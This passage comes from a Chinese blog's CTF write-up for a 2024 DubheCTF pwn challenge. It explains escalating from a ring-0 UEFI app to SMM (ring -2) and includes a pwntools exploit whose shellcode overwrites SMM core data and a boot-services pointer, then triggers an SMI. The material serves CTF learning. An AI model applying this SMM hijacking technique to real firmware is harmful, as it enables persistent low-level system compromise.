+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiManage</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN     CONST EFI_GUID  *HandlerType,</span><br><span class="hljs-params">  IN     CONST VOID      *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span><br><span class="hljs-params">  )</span><br>&#123;<br>    ……<br>    <br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Non-root SMI handler</span><br>    <span class="hljs-comment">//</span><br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);<br>    <br>    ……<br>    <br>    Status             = SmiHandler-&gt;Handler (<br>                                       (EFI_HANDLE)SmiHandler,<br>                                       Context,<br>                                       CommBuffer,<br>                                       CommBufferSize<br>                                       );<br>    <br>    ……<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;<br></code></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li><p>ToyApp处于ring 0，读取真的flag需要ring -2</p>
+</li>
+<li><p>ToyApp已经给了执行shellcode的功能，可以直接写shellcode发出SMI进入ring -2</p>
+</li>
+<li><p>SMI执行的handler由mSmmCorePrivateData全局变量决定，可以通过shellcode更改mSmmCorePrivateData</p>
+</li>
+<li><p>ToySMM的handler中调用了gBS-&gt;LocateProtocol，可以更改这个函数指针为PrintFlag来绕过&amp;aaaa &#x3D;&#x3D; (int *)0x23330000 &amp;&amp; cmpString((_BYTE *)0x23330000, &amp;aaaa, 3i64)</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/change.png" srcset="/img/loading.gif" lazyload class title="change">
+
+<p>这题第一次上的时候附件还有问题，&amp;aaaa !&#x3D; (int *)0x23330000 || !StringCmp(0x23330000i64, &amp;aaaa, 3i64)，乐</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/old.png" srcset="/img/loading.gif" lazyload class title="old"></li>
+</ul>
+<h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>来自呆神</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>p = process(<span class="hljs-string">&quot;./run.sh&quot;</span>, shell=<span class="hljs-literal">True</span>)<br><br>ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x)<br>sn = <span class="hljs-keyword">lambda</span> x : p.send(x)<br>rl = <span class="hljs-keyword">lambda</span> : p.recvline()<br>sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)<br>rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)<br>sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)<br>sla = <span class="hljs-keyword">lambda</span> a,b : p.sendlineafter(a, b)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>smm_buffer = <span class="hljs-number">0x6ad9380</span><br>guid = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)<br>CommBuffer_offset = <span class="hljs-number">56</span><br>BufferSize_offset = CommBuffer_offset + <span class="hljs-number">8</span><br>ReturnStatus_offset = BufferSize_offset + <span class="hljs-number">8</span><br>bootservice = <span class="hljs-number">0x6FD6B80</span><br>backdoor = <span class="hljs-number">0x7F06000</span><br>payload = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              </span><br><span class="hljs-string">mov rcx, 0x6FD6B80				/* gBS-&gt;LocateProtocol = PrintFlag */</span><br><span class="hljs-string">add rcx, 0x140</span><br><span class="hljs-string">mov rdx, 0x7F06000</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad9400				/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span><br><span class="hljs-string">mov rdx, 0xEC86B7F3B31CF11E</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string">mov rdx, 0x9D76F4B1548E0872</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8						/* CommBuffer-&gt;MessageLength = 4 */</span><br><span class="hljs-string">mov rdx, 0x4</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 24						/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span><br><span class="hljs-string">mov rdx, 0x41414141</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad93b8				/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span><br><span class="hljs-string">mov rdx, 0x6ad9400</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8						/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span><br><span class="hljs-string">mov rdx, 0x1c</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor eax, eax					/* SMI */</span><br><span class="hljs-string">mov dx, 0xb2</span><br><span class="hljs-string">mov al, 0x00</span><br><span class="hljs-string">outb dx, al</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;Your shellcode:&#x27;</span>)<br>raw_input(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>sl(payload.<span class="hljs-built_in">hex</span>())<br>sl(<span class="hljs-string">&quot;DONE&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024 DubheCTF pwn wp</div>
+      <div>http://akaieurus.github.io/2024/03/19/天枢ctf-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="《UEFI原理与编程》读书笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">《UEFI原理与编程》读书笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="nft源码分析">
+                        <span class="hidden-mobile">nft源码分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
